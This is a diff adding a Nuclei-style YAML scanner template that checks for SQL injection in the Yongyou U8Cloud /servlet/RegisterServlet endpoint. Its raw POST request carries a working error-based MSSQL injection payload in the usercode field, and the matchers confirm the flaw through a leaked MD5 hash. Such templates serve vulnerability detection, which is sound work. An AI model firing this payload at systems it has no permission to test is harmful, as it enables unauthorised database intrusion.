@@ -1,0 +1,37 @@
+id: poc-yaml-yongyou-u8cloud-servlet-registerservlet-sqli
+info:
+  name: Yongyou U8Cloud servlet-RegisterServlet SQL Injection Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+  description: |
+    SQL Injection vulnerability in Yongyou U8Cloud servlet RegisterServlet endpoint. This template checks for SQL injection by analyzing the response for specific strings and the presence of an MD5 hash.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{md5(t1)}}"
+
+http:
+  - raw:
+      - |
+        POST /servlet/RegisterServlet HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+        X-Forwarded-For: 127.0.0.1
+
+        usercode=1' and substring(sys.fn_sqlvarbasetostr(HashBytes('MD5','{{t1}}')),3,32)>0--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "nvarchar"
+          - "{{t2}}"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
